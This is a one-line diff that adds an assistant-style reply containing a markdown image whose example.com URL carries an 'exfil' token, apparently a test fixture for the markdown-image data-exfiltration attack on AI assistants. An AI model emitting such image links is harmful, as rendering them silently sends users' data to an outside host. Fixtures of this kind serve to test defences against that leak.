@@ -1,0 +1,1 @@
+Here is what I found: ![chart](https://example.com/gobbonet-render-leak.png?exfil=EXFIL_A1B2) and see [this source](https://example.com/gobbonet-link) for details.
